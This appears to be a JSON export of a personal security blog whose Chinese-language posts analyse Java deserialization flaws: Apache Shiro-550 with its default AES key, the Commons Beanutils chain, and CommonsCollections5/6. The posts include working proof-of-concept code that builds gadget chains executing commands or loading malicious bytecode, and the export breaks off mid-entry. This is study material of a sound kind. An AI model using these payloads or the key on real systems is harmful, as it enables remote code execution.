{"meta":{"title":"self_209'blog","subtitle":"","description":"","author":"self_209","url":"https://self209.github.io","root":"/"},"pages":[{"title":"all-categories","date":"2021-12-25T10:13:54.918Z","updated":"2021-12-25T10:13:54.918Z","comments":false,"path":"all-categories/index.html","permalink":"https://self209.github.io/all-categories/index.html","excerpt":"","text":""},{"title":"all-tags","date":"2021-12-25T10:15:46.692Z","updated":"2021-12-25T10:15:46.692Z","comments":false,"path":"all-tags/index.html","permalink":"https://self209.github.io/all-tags/index.html","excerpt":"","text":""},{"title":"all-archives","date":"2021-12-25T10:16:57.727Z","updated":"2021-12-25T10:16:57.727Z","comments":false,"path":"all-archives/index.html","permalink":"https://self209.github.io/all-archives/index.html","excerpt":"","text":""}],"posts":[{"title":"Shiro反序列化-550","slug":"20220109","date":"2022-01-09T05:38:24.000Z","updated":"2022-01-10T14:51:34.362Z","comments":false,"path":"2022/01/09/20220109/","link":"","permalink":"https://self209.github.io/2022/01/09/20220109/","excerpt":"Shiro反序列化漏洞有两个一个是Shiro-550(Shiro≤1.2.4版本)，一个是Shiro-721(Shiro&lt;1.4.2版本)，本文是对Shiro-550的分析学习。","text":"Shiro反序列化漏洞有两个一个是Shiro-550(Shiro≤1.2.4版本)，一个是Shiro-721(Shiro&lt;1.4.2版本)，本文是对Shiro-550的分析学习。 漏洞环境： shiro：https://github.com/apache/shiro 1234git clone https://github.com/apache/shiro.gitcd shiro//切换到1.2.4版本git checkout shiro-root-1.2.4 注意：修改shiro/samples/web目录下的pom.xml，将jstl的版本修改为1.2 123456&lt;dependency&gt; &lt;groupId&gt;javax.servlet&lt;/groupId&gt; &lt;artifactId&gt;jstl&lt;/artifactId&gt; &lt;version&gt;1.2&lt;/version&gt; &lt;scope&gt;runtime&lt;/scope&gt;&lt;/dependency&gt; ieda配置tomcat：https://www.bilibili.com/video/BV1V54y1q7Qj 漏洞分析rememberMe加密生成过程1234567891011121314151617调用过程：DefaultSecurityManager.login()-&gt;DefaultSecurityManager.onSuccessfulLogin()-&gt;DefaultSecurityManager.rememberMeSuccessfulLogin()-&gt; AbstractRememberMeManager.onSuccessfulLogin()-&gt; CookieRememberMeManager.forgetIdentity(Subject subject)-&gt; WebUtils.getHttpRequest()-&gt; WebUtils.getHttpResponse()-&gt; CookieRememberMeManager.forgetIdentity(HttpServletRequest request, HttpServletResponse response)-&gt; CookieRememberMeManager.getCookie()-&gt; SimpleCookie.removeFrom()-&gt; AbstractRememberMeManager.rememberIdentity(Subject subject, AuthenticationToken token, AuthenticationInfo authcInfo)-&gt; AbstractRememberMeManager.rememberIdentity(Subject subject, PrincipalCollection accountPrincipals)-&gt; AbstractRememberMeManager.convertPrincipalsToBytes()-&gt; AbstractRememberMeManager.serialize()-&gt;//对用户对象进行序列化 AbstractRememberMeManager.encrypt()-&gt;//对序列化用户对象的字节数组进行加密 CookieRememberMeManager.rememberSerializedIdentity()//对加密的字节数组进行base64编码，保存在cookie中。 org/apache/shiro/mgt/DefaultSecurityManager.java的login下断点，login方法调用了onSuccessfulLogin方法，onSuccessfulLogin方法调用rememberMeSuccessfulLogin方法，rememberMeSuccessfulLogin方法调用AbstractRememberMeManager.onSuccessfulLogin方法。 AbstractRememberMeManager.onSuccessfulLogin方法调用CookieRememberMeManager.forgetIdentity方法，forgetIdentity方法会先获取请求和响应包，调用getCookie获取请求的cookie，调用SimpleCookie.removeFrom方法在response头部添加Set-Cookie: rememberMe=deleteMe 然后再回到onSuccessfulLogin方法中，如果设置rememberMe则进入rememberIdentity。 rememberIdentity调用convertPrincipalsToBytes方法 进入convertPrincipalsToBytes方法，先对用户对象进行序列化，然后对序列化的数据进行加密，跟进encrypt方法。加密算法为AES，模式为CBC，填充算法为PKCS5Padding。 调用getEncryptionCipherKey获取加密密钥，在Shiro≤1.2.4中默认密钥为kPH+bIxk5D2deZiIxcaaaA== 加密完成返回，接着调用CookieRememberMeManager.rememberSerializedIdentity方法 跟进CookieRememberMeManager.rememberSerializedIdentity方法，对加密的字节数组进行base64编码，保存在cookie中。 rememberMe解密反序列化过程123456789调用过程：DefaultSecurityManager.resolvePrincipals()-&gt;DefaultSecurityManager.getRememberedIdentity()-&gt; AbstractRememberMeManager.getRememberedPrincipals()-&gt; CookieRememberMeManager.getRememberedSerializedIdentity()-&gt; AbstractRememberMeManager.convertBytesToPrincipals()-&gt; AbstractRememberMeManager.decrypt()-&gt; AbstractRememberMeManager.deserialize()-&gt; DefaultSerializer.deserialize() 在DefaultSecurityManager.resolvePrincipals方法下断点， resolvePrincipals方法调用getRememberedIdentity方法，跟进getRememberedIdentity方法。 getRememberedIdentity方法调用AbstractRememberMeManager.getRememberedPrincipals方法，跟进getRememberedPrincipals方法。 getRememberedPrincipals方法调用CookieRememberMeManager.getRememberedSerializedIdentity方法，跟进getRememberedSerializedIdentity方法。获取序列化的凭证，从请求中获取 Cookie 中的 rememberMe 并进⾏ base64 解码，解码后内容为AES加密内容字节数组并返回给bytes字节数组。 回到getRememberedPrincipals方法，调用convertBytesToPrincipals 方法，将解码的内容传⼊ convertBytesToPrincipals 进⾏ AES 解密和反序列化，调⽤ decrypt 方法进⾏AES解密 跟进decrypt方法，getDecryptionCipherKey方法获取密钥(Shiro≤1.2.4中默认密钥为kPH+bIxk5D2deZiIxcaaaA==)，进行解密，最后返回解密完成后序列化对象的字节数组。 回到convertBytesToPrincipals方法，调用deserialize方法，跟进deserialize方法。 先调用getSerializer方法获取DefaultSerializer对象，调用DefaultSerializer对象的deserialize方法，跟进DefaultSerializer.deserialize方法。通过字节输入流将其反序列化，至此rememberMe解密反序列化过程结束。 shiro检测shiro-550检测就两点，一是key，二是Gadget chain。虽然≤1.2.4中默认密钥为kPH+bIxk5D2deZiIxcaaaA==，官方针对这个漏洞的修复方式是去掉了默认的Key，生成随机的Key，所以在检测漏洞时我们需要先确定密钥。 参考：一种另类的shiro检测方式 通过是否返回rememberMe=deleteMe判断key的正确性 我们回到解密过程的AbstractRememberMeManager.getRememberedPrincipals方法的convertBytesToPrincipals方法 12345678910111213141516171819202122public PrincipalCollection getRememberedPrincipals(SubjectContext subjectContext) &#123; PrincipalCollection principals = null; try &#123; byte[] bytes = this.getRememberedSerializedIdentity(subjectContext); if (bytes != null &amp;&amp; bytes.length &gt; 0) &#123; principals = this.convertBytesToPrincipals(bytes, subjectContext); &#125; &#125; catch (RuntimeException var4) &#123; principals = this.onRememberedPrincipalFailure(var4, subjectContext); &#125; return principals;&#125;protected PrincipalCollection convertBytesToPrincipals(byte[] bytes, SubjectContext subjectContext) &#123; if (this.getCipherService() != null) &#123; bytes = this.decrypt(bytes); &#125; return this.deserialize(bytes);&#125; 调用decrypt方法进行解密，当key错误的时候解密失败，就会抛出异常，getRememberedPrincipals方法就会捕获异常，调用onRememberedPrincipalFailure方法， 12345678protected PrincipalCollection onRememberedPrincipalFailure(RuntimeException e, SubjectContext context) &#123; if (log.isDebugEnabled()) &#123; log.debug(&quot;There was a failure while trying to retrieve remembered principals. This could be due to a configuration problem or corrupted principals. This could also be due to a recently changed encryption key. The remembered identity will be forgotten and not used for this request.&quot;, e); &#125; this.forgetIdentity(context); throw e;&#125; onRememberedPrincipalFailure方法调用forgetIdentity方法，forgetIdentity方法在前面加密过程中有提到，调用SimpleCookie.removeFrom方法在response头部添加Set-Cookie: rememberMe=deleteMe，当我们key错误的时候会返回rememberMe=deleteMe，这是一种情况。 还有一种情况，用反序列化 gadget 生成之后，拿shiro加密算法进行加密，但是最后依然在 response里面携带了rememberMe=deleteMe。 还是回到 AbstractRememberMeManager.convertBytesToPrincipals方法当中，这里的key肯定是正确的，所以经过 decrypt处理之后返回 bytes数组，调用deserialize方法，跟进deserialize方法。 123protected PrincipalCollection deserialize(byte[] serializedIdentity) &#123; return (PrincipalCollection)this.getSerializer().deserialize(serializedIdentity);&#125; 反序列化的 gadget 实际上并不是继承了 PrincipalCollection ，所以这里进行类型转换会报错。在做类型转换之前，先进入了 DefaultSerializer#deserialize 进行反序列化处理，等处理结束返回 deserialized 时候，进行类型转换自然又回到了上面提到的类型转换异常，我们 key 不正确的情况下的 catch 异常捕获的逻辑里，后面的流程就和上述一样了。 结合以上两种情况，只需要满足两点： 1.构造一个继承 PrincipalCollection 的序列化对象。 2.key正确情况下不返回 deleteMe ，key错误情况下返回 deleteMe 。 基于这两个条件下 SimplePrincipalCollection 这个类自然就出现了，这个类可被序列化，继承了 PrincipalCollection 。 构造POC实际上也很简单，构造一个这个空对象也是可以达到效果的。 1234SimplePrincipalCollection simplePrincipalCollection = new SimplePrincipalCollection();ObjectOutputStream obj = new ObjectOutputStream(new FileOutputStream(&quot;payload&quot;));obj.writeObject(simplePrincipalCollection);obj.close(); Commons Beanutils反序列化Gadget chain: 1234567891011ObjectInputStream.readObject() PriorityQueue.readObject() PriorityQueue.heapify() PriorityQueue.siftDown() PriorityQueue.siftDownUsingComparator() BeanComparator.compare() TemplatesImpl.getOutputProperties() TemplatesImpl.newTransformer() TemplatesImpl.getTransletInstance() TemplatesImpl.defineTransletClasses() TemplatesImpl.defineClass() 首先我们需要了解Commons Beanutils是干什么的，Commons Beanutils 是 Apache Commons 工具集下的另一个项目，它提供了对普通Java类对象（也称为JavaBean）的一些操作方法。 例： 12345678910public class Cat &#123; private String name = &quot;miao~ miao~&quot;; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125;&#125; 它包含一个私有属性name，和读取和设置这个属性的两个方法，又称为getter和setter。其中，getter的方法名以get开头，setter的方法名以set开头，全名符合骆驼式命名法（Camel-Case）。 commons-beanutils中提供了一个静态方法 PropertyUtils.getProperty ，让使用者可以动态调用任意JavaBean的getter方法 例： 12345public static void main(String[] args)&#123; Cat cat = new Cat(); System.out.println(PropertyUtils.getProperty(cat,&quot;name&quot;));&#125; 调试看看getProperty做了一些什么。 进入PropertyUtils.getProperty，调用PropertyUtilsBean.getProperty方法，跟进继续调用PropertyUtilsBean.getNestedProperty方法，继续跟进。 12345678910111213141516171819202122232425262728293031323334353637383940public Object getNestedProperty(Object bean, String name) throws IllegalAccessException, InvocationTargetException, NoSuchMethodException &#123; if (bean == null) &#123; throw new IllegalArgumentException(&quot;No bean specified&quot;); &#125; else if (name == null) &#123; throw new IllegalArgumentException(&quot;No name specified for bean class &#x27;&quot; + bean.getClass() + &quot;&#x27;&quot;); &#125; else &#123; while(this.resolver.hasNested(name)) &#123; String next = this.resolver.next(name); Object nestedBean = null; if (bean instanceof Map) &#123; nestedBean = this.getPropertyOfMapBean((Map)bean, next); &#125; else if (this.resolver.isMapped(next)) &#123; nestedBean = this.getMappedProperty(bean, next); &#125; else if (this.resolver.isIndexed(next)) &#123; nestedBean = this.getIndexedProperty(bean, next); &#125; else &#123; nestedBean = this.getSimpleProperty(bean, next); &#125; if (nestedBean == null) &#123; throw new NestedNullException(&quot;Null property value for &#x27;&quot; + name + &quot;&#x27; on bean class &#x27;&quot; + bean.getClass() + &quot;&#x27;&quot;); &#125; bean = nestedBean; name = this.resolver.remove(name); &#125; if (bean instanceof Map) &#123; bean = this.getPropertyOfMapBean((Map)bean, name); &#125; else if (this.resolver.isMapped(name)) &#123; bean = this.getMappedProperty(bean, name); &#125; else if (this.resolver.isIndexed(name)) &#123; bean = this.getIndexedProperty(bean, name); &#125; else &#123; bean = this.getSimpleProperty(bean, name); &#125; return bean; &#125; &#125; 经过一系列判断，最后调用getSimpleProperty方法，继续跟进。 又是一系列判断，最后调用getPropertyDescriptor方法，这个方法检索指定 bean 的指定属性的属性描述符，其中就会返回getter方法和setter方法。 然后通过反射获取getter方法。 123Method getReadMethod(Class clazz, PropertyDescriptor descriptor) &#123; return MethodUtils.getAccessibleMethod(clazz, descriptor.getReadMethod());&#125; 再invoke调用 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283private Object invokeMethod(Method method, Object bean, Object[] values) throws IllegalAccessException, InvocationTargetException &#123; if (bean == null) &#123; throw new IllegalArgumentException(&quot;No bean specified - this should have been checked before reaching this method&quot;); &#125; else &#123; String valueString; int i; Class[] parTypes; int i; String expectedString; IllegalArgumentException e; try &#123; return method.invoke(bean, values); &#125; catch (NullPointerException var9) &#123; valueString = &quot;&quot;; if (values != null) &#123; for(i = 0; i &lt; values.length; ++i) &#123; if (i &gt; 0) &#123; valueString = valueString + &quot;, &quot;; &#125; if (values[i] == null) &#123; valueString = valueString + &quot;&lt;null&gt;&quot;; &#125; else &#123; valueString = valueString + values[i].getClass().getName(); &#125; &#125; &#125; expectedString = &quot;&quot;; parTypes = method.getParameterTypes(); if (parTypes != null) &#123; for(i = 0; i &lt; parTypes.length; ++i) &#123; if (i &gt; 0) &#123; expectedString = expectedString + &quot;, &quot;; &#125; expectedString = expectedString + parTypes[i].getName(); &#125; &#125; e = new IllegalArgumentException(&quot;Cannot invoke &quot; + method.getDeclaringClass().getName() + &quot;.&quot; + method.getName() + &quot; on bean class &#x27;&quot; + bean.getClass() + &quot;&#x27; - &quot; + var9.getMessage() + &quot; - had objects of type \\&quot;&quot; + valueString + &quot;\\&quot; but expected signature \\&quot;&quot; + expectedString + &quot;\\&quot;&quot;); if (!BeanUtils.initCause(e, var9)) &#123; this.log.error(&quot;Method invocation failed&quot;, var9); &#125; throw e; &#125; catch (IllegalArgumentException var10) &#123; valueString = &quot;&quot;; if (values != null) &#123; for(i = 0; i &lt; values.length; ++i) &#123; if (i &gt; 0) &#123; valueString = valueString + &quot;, &quot;; &#125; if (values[i] == null) &#123; valueString = valueString + &quot;&lt;null&gt;&quot;; &#125; else &#123; valueString = valueString + values[i].getClass().getName(); &#125; &#125; &#125; expectedString = &quot;&quot;; parTypes = method.getParameterTypes(); if (parTypes != null) &#123; for(i = 0; i &lt; parTypes.length; ++i) &#123; if (i &gt; 0) &#123; expectedString = expectedString + &quot;, &quot;; &#125; expectedString = expectedString + parTypes[i].getName(); &#125; &#125; e = new IllegalArgumentException(&quot;Cannot invoke &quot; + method.getDeclaringClass().getName() + &quot;.&quot; + method.getName() + &quot; on bean class &#x27;&quot; + bean.getClass() + &quot;&#x27; - &quot; + var10.getMessage() + &quot; - had objects of type \\&quot;&quot; + valueString + &quot;\\&quot; but expected signature \\&quot;&quot; + expectedString + &quot;\\&quot;&quot;); if (!BeanUtils.initCause(e, var10)) &#123; this.log.error(&quot;Method invocation failed&quot;, var10); &#125; throw e; &#125; &#125;&#125; 那么我们找到一个与getter方法类似的方法，通过getProperty方法调用呢？在cc2中我们用到了类加载代码执行TemplatesImpl类，知道调用newTransformer方法就会加载我准备的恶意代码，在找什么地方调用newTransformer方法的时候在TemplatesImpl类下有一个getOutputProperties方法也调用了newTransformer方法，并且方法名与getter方法类似，我们尝试通过getProperty方法调用。 事实证明是可以的，那我们就需要找调用链，找什么地方使用了getProperty方法。 BeanComparator.compare()在BeanComparator.compare方法中调用了getProperty方法，并且o1可控，property可通过反射赋值。 12345678910111213141516171819private String property;public int compare(Object o1, Object o2) &#123; if (this.property == null) &#123; return this.comparator.compare(o1, o2); &#125; else &#123; try &#123; Object value1 = PropertyUtils.getProperty(o1, this.property); Object value2 = PropertyUtils.getProperty(o2, this.property); return this.comparator.compare(value1, value2); &#125; catch (IllegalAccessException var5) &#123; throw new RuntimeException(&quot;IllegalAccessException: &quot; + var5.toString()); &#125; catch (InvocationTargetException var6) &#123; throw new RuntimeException(&quot;InvocationTargetException: &quot; + var6.toString()); &#125; catch (NoSuchMethodException var7) &#123; throw new RuntimeException(&quot;NoSuchMethodException: &quot; + var7.toString()); &#125; &#125; &#125; 我们new一个BeanComparator对象，通过反射修改property的值为outputProperties，当调用compare方法是传递templates对象就会调用getProperty方法，就会触发恶意代码，理想总是美好的，现实是残酷的。报错了。 这里我们需要传递一个Comparator，如果不传的话他就会调用ComparableComparator.getInstance，他是commons collections的类，这里就会需要cc的依赖，我们需要找到一个类来替换，这个类需要实现 Comparator 和Serializable 接口，通过IDEA的功能，我们找到一个 ReverseComparator。 通过Collections.reverseOrder()获取ReverseComparator对象，传递到BeanComparator构造方法中。 到了这一步就要cc2相似了，就是PriorityQueue类，这里就不赘述了，直接看完整poc。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import org.apache.commons.beanutils.BeanComparator;import java.io.*;import java.lang.reflect.Field;import java.lang.reflect.InvocationTargetException;import java.nio.file.Files;import java.nio.file.Paths;import java.util.Collections;import java.util.PriorityQueue;public class CommonsBeanutilsSerialize &#123; public static void Serialize(Object object) throws IOException &#123; ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;CB.txt&quot;)); oos.writeObject(object); &#125; public static void unSerialize(String FileName) throws IOException, ClassNotFoundException &#123; ObjectInputStream ois = new ObjectInputStream(new FileInputStream(FileName)); ois.readObject(); &#125; public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException, InvocationTargetException, NoSuchMethodException, ClassNotFoundException &#123; TemplatesImpl templates = new TemplatesImpl(); byte[] code = Files.readAllBytes(Paths.get(&quot;C:/Users/self_209/Desktop/CodeImplement.class&quot;)); byte[][] _bytecodes = &#123;code&#125;; Class c = templates.getClass(); Field name = c.getDeclaredField(&quot;_name&quot;); name.setAccessible(true); name.set(templates, &quot;ok&quot;); Field bytecodes = c.getDeclaredField(&quot;_bytecodes&quot;); bytecodes.setAccessible(true); bytecodes.set(templates, _bytecodes); Field tfactory = c.getDeclaredField(&quot;_tfactory&quot;); tfactory.setAccessible(true); tfactory.set(templates, new TransformerFactoryImpl()); BeanComparator comparator = new BeanComparator(null, Collections.reverseOrder()); PriorityQueue priorityQueue = new PriorityQueue(2,comparator); priorityQueue.offer(1); priorityQueue.offer(1); Class aClass = comparator.getClass(); Field property = aClass.getDeclaredField(&quot;property&quot;); property.setAccessible(true); property.set(comparator,&quot;outputProperties&quot;); //为防止在offer的时候触发compare方法，我们就在添加完以后使用反射修改queue对象数组的值。 Class priorityQueueClass = priorityQueue.getClass(); Field queueField = priorityQueueClass.getDeclaredField(&quot;queue&quot;); queueField.setAccessible(true); queueField.set(priorityQueue,new Object[]&#123;templates,templates&#125;); &#125;&#125; 序列化： 反序列化：","categories":[],"tags":[{"name":"反序列化","slug":"反序列化","permalink":"https://self209.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"java安全","slug":"java安全","permalink":"https://self209.github.io/tags/java%E5%AE%89%E5%85%A8/"}]},{"title":"java反序列化Commons Collections(四)","slug":"20220102-1","date":"2022-01-02T12:39:42.000Z","updated":"2022-01-07T08:17:28.095Z","comments":false,"path":"2022/01/02/20220102-1/","link":"","permalink":"https://self209.github.io/2022/01/02/20220102-1/","excerpt":"本文继续CommonsCollections5 、 CommonsCollections6 Gadget chain 分析，cc5、6的执行类与cc1一样，所以这里只对不一样的部分进行分析。","text":"本文继续CommonsCollections5 、 CommonsCollections6 Gadget chain 分析，cc5、6的执行类与cc1一样，所以这里只对不一样的部分进行分析。 CommonsCollections5漏洞环境： java：Java SE 8 Development Kit 8u65 commons-collections：3.2.1 gradle：implementation group: ‘commons-collections’, name: ‘commons-collections’, version: ‘3.2.1’ ysoserial Gadget chain： 123456789Gadget chain: ObjectInputStream.readObject() BadAttributeValueExpException.readObject() TiedMapEntry.toString() TiedMapEntry.getValue() LazyMap.get() ChainedTransformer.transform() ConstantTransformer.transform() InvokerTransformer.transform() TiedMapEntry.getValue()1234567891011121314151617public class TiedMapEntry implements Map.Entry, KeyValue, Serializable &#123; private final Object key; private final Map map; public TiedMapEntry(Map map, Object key) &#123; super(); this.map = map; this.key = key; &#125; public Object getValue() &#123; return map.get(key); &#125; &#125; 在TiedMapEntry类的getValue方法中调用了get方法，map、key可通过构造方法传递。 TiedMapEntry.toString()123public String toString() &#123; return getKey() + &quot;=&quot; + getValue();&#125; TiedMapEntry类的toString方法调用了getValue方法。 12345678910111213141516171819public static void main(String[] args)&#123; Transformer[] transformers = new Transformer[]&#123; //ConstantTransformer对象负责把String类型换成Runtime.class new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;), new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;), new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;) &#125;; //new 一个ChainedTransformer对象传递一个Transformer[]数组循环调用对象的transform方法 Transformer chainedTransformer = (Transformer) new ChainedTransformer(transformers); //decorate还需要一个Map类型，所以new一个HashMap,因为map.containsKey(key)会判断是否包含指定的键，所以我们传一个空的map就行，让他走到factory.transform(key); Map&lt;Integer,Integer&gt; map = new HashMap&lt;&gt;(); //调用decorate静态方法构造LazyMap对象，它返回Map类型。 Map&lt;Object,Object&gt; r = LazyMap.decorate(map,chainedTransformer); TiedMapEntry tiedMapEntry = new TiedMapEntry(r, r); tiedMapEntry.toString();&#125; BadAttributeValueExpException.readObject()1234567891011121314151617181920212223242526272829303132333435public class BadAttributeValueExpException extends Exception &#123; private Object val; public BadAttributeValueExpException (Object val) &#123; this.val = val == null ? null : val.toString(); &#125; public String toString() &#123; return &quot;BadAttributeValueException: &quot; + val; &#125; private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException &#123; ObjectInputStream.GetField gf = ois.readFields(); Object valObj = gf.get(&quot;val&quot;, null); if (valObj == null) &#123; val = null; &#125; else if (valObj instanceof String) &#123; val= valObj; &#125; else if (System.getSecurityManager() == null || valObj instanceof Long || valObj instanceof Integer || valObj instanceof Float || valObj instanceof Double || valObj instanceof Byte || valObj instanceof Short || valObj instanceof Boolean) &#123; val = valObj.toString(); &#125; else &#123; // the serialized object is from a version without JDK-8019292 fix val = System.identityHashCode(valObj) + &quot;@&quot; + valObj.getClass().getName(); &#125; &#125; &#125; BadAttributeValueExpException的readObject方法中调用了valObj的toString方法，valObj对象是通过从输入流读取val获取指定 Object 字段，也就是说我们需要把tiedMapEntry对象传递到val属性中，但是直接通过构造函数的话会直接调用toString方法，所以这里使用反射，先构造BadAttributeValueExpException对象传递null，完成实例化后通过反射修改val的值。 123456789101112131415161718Transformer[] transformers = new Transformer[]&#123; //ConstantTransformer对象负责把String类型换成Runtime.class new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;), new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;), new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;) &#125;; //new 一个ChainedTransformer对象传递一个Transformer[]数组循环调用对象的transform方法 Transformer chainedTransformer = (Transformer) new ChainedTransformer(transformers); //decorate还需要一个Map类型，所以new一个HashMap,因为map.containsKey(key)会判断是否包含指定的键，所以我们传一个空的map就行，让他走到factory.transform(key); Map&lt;Integer,Integer&gt; map = new HashMap&lt;&gt;(); //调用decorate静态方法构造LazyMap对象，它返回Map类型。 Map&lt;Object,Object&gt; r = LazyMap.decorate(map,chainedTransformer); TiedMapEntry tiedMapEntry = new TiedMapEntry(r, r); BadAttributeValueExpException val = new BadAttributeValueExpException(null); Field valfield = val.getClass().getDeclaredField(&quot;val&quot;); valfield.setAccessible(true); valfield.set(val,tiedMapEntry); CommonsCollections6ysoserial Gadget chain： 1234567891011Gadget chain: java.io.ObjectInputStream.readObject() HashSet.readObject() HashMap.put() HashMap.hash() TiedMapEntry.hashCode() TiedMapEntry.getValue() LazyMap.get() ChainedTransformer.transform() ConstantTransformer.transform() InvokerTransformer.transform() CC6的HashMap.hash调用了hashCode方法，这个在URLDNS中有介绍到，这里就不赘述了。我们直接看HashMap.put()。 HashMap.put()12345678static final int hash(Object key) &#123; int h; return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16);&#125;public V put(K key, V value) &#123; return putVal(hash(key), key, value, false, true);&#125; put方法中调用了hash方法，传递一个key对象，那我们只需要把TiedMapEntry对象传递到key中，当调用hash方法就会就会返回TiedMapEntry.hashCode() 12345678910111213141516Transformer[] transformers = new Transformer[]&#123; //ConstantTransformer对象负责把String类型换成Runtime.class new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;), new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;), new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)&#125;;//new 一个ChainedTransformer对象传递一个Transformer[]数组循环调用对象的transform方法Transformer chainedTransformer = (Transformer) new ChainedTransformer(transformers);//decorate还需要一个Map类型，所以new一个HashMap,因为map.containsKey(key)会判断是否包含指定的键，所以我们传一个空的map就行，让他走到factory.transform(key);Map&lt;Integer,Integer&gt; map = new HashMap&lt;&gt;();//调用decorate静态方法构造LazyMap对象，它返回Map类型。Map&lt;Object,Object&gt; r = LazyMap.decorate(map,chainedTransformer);TiedMapEntry tiedMapEntry = new TiedMapEntry(r, r);Map&lt;TiedMapEntry,Integer&gt; map2 = new HashMap&lt;&gt;();map2.put(tiedMapEntry,1); HashSet.readObject()12345678910111213141516171819202122232425262728293031323334353637383940414243private void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException &#123; // Read in any hidden serialization magic s.defaultReadObject(); // Read capacity and verify non-negative. int capacity = s.readInt(); if (capacity &lt; 0) &#123; throw new InvalidObjectException(&quot;Illegal capacity: &quot; + capacity); &#125; // Read load factor and verify positive and non NaN. float loadFactor = s.readFloat(); if (loadFactor &lt;= 0 || Float.isNaN(loadFactor)) &#123; throw new InvalidObjectException(&quot;Illegal load factor: &quot; + loadFactor); &#125; // Read size and verify non-negative. int size = s.readInt(); if (size &lt; 0) &#123; throw new InvalidObjectException(&quot;Illegal size: &quot; + size); &#125; // Set the capacity according to the size and load factor ensuring that // the HashMap is at least 25% full but clamping to maximum capacity. capacity = (int) Math.min(size * Math.min(1 / loadFactor, 4.0f), HashMap.MAXIMUM_CAPACITY); // Create backing HashMap map = (((HashSet&lt;?&gt;)this) instanceof LinkedHashSet ? new LinkedHashMap&lt;E,Object&gt;(capacity, loadFactor) : new HashMap&lt;E,Object&gt;(capacity, loadFactor)); // Read in all elements in the proper order. for (int i=0; i&lt;size; i++) &#123; @SuppressWarnings(&quot;unchecked&quot;) E e = (E) s.readObject(); map.put(e, PRESENT); &#125;&#125; 在HashSet.readObject方法中，跟进put()方法，进入java.util.HashMap中调用put()方法，接着调用hash()方法，进而调用key.hashCode()，这里只需要让key为TiedMapEntry对象即可。这里通过反射获取HashSet的class对象的map属性，然后通过get方法获取hashSet对象上map字段的值。再反射获取HashMap的class对象的table属性，然后通过get方法获取innImpl对象上table字段的值。table字段的值是Node&lt;K,V&gt;对象，这里我并不知道Node&lt;K,V&gt;对象是什么，只知道他是HashMap的内部类，之后获取Node&lt;K,V&gt;类的class对象并且获取key属性，将tiedMapEntry对象set给key属性，讲道理这里我并不是很理解，我只知道ysoserial工具是这样操作的。 123456789101112131415161718192021222324252627282930Transformer[] transformers = new Transformer[]&#123; //ConstantTransformer对象负责把String类型换成Runtime.class new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;), new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;), new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)&#125;;//new 一个ChainedTransformer对象传递一个Transformer[]数组循环调用对象的transform方法Transformer chainedTransformer = (Transformer) new ChainedTransformer(transformers);//decorate还需要一个Map类型，所以new一个HashMap,因为map.containsKey(key)会判断是否包含指定的键，所以我们传一个空的map就行，让他走到factory.transform(key);Map&lt;Integer,Integer&gt; map = new HashMap&lt;&gt;();//调用decorate静态方法构造LazyMap对象，它返回Map类型。Map&lt;Object,Object&gt; r = LazyMap.decorate(map,chainedTransformer);TiedMapEntry tiedMapEntry = new TiedMapEntry(r, r);Map&lt;TiedMapEntry,Integer&gt; map2 = new HashMap&lt;&gt;();HashSet hashSet = new HashSet(1);hashSet.add(&quot;foo&quot;);Field f = HashSet.class.getDeclaredField(&quot;map&quot;);f.setAccessible(true);HashMap innImpl = (HashMap) f.get(hashSet);Field f2 = HashMap.class.getDeclaredField(&quot;table&quot;);f2.setAccessible(true);Object[] array = (Object[]) f2.get(innImpl);Object node = array[0];if(node == null)&#123; node = array[1];&#125;Field keyField = node.getClass().getDeclaredField(&quot;key&quot;);keyField.setAccessible(true);keyField.set(node,tiedMapEntry);","categories":[],"tags":[{"name":"反序列化","slug":"反序列化","permalink":"https://self209.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"java安全","slug":"java安全","permalink":"https://self209.github.io/tags/java%E5%AE%89%E5%85%A8/"}]},{"title":"java反序列化Commons Collections(三)","slug":"20220102","date":"2022-01-02T03:37:50.000Z","updated":"2022-01-10T07:30:03.014Z","comments":false,"path":"2022/01/02/20220102/","link":"","permalink":"https://self209.github.io/2022/01/02/20220102/","excerpt":"本文继续CommonsCollections3 和 CommonsCollections4 Gadget chain 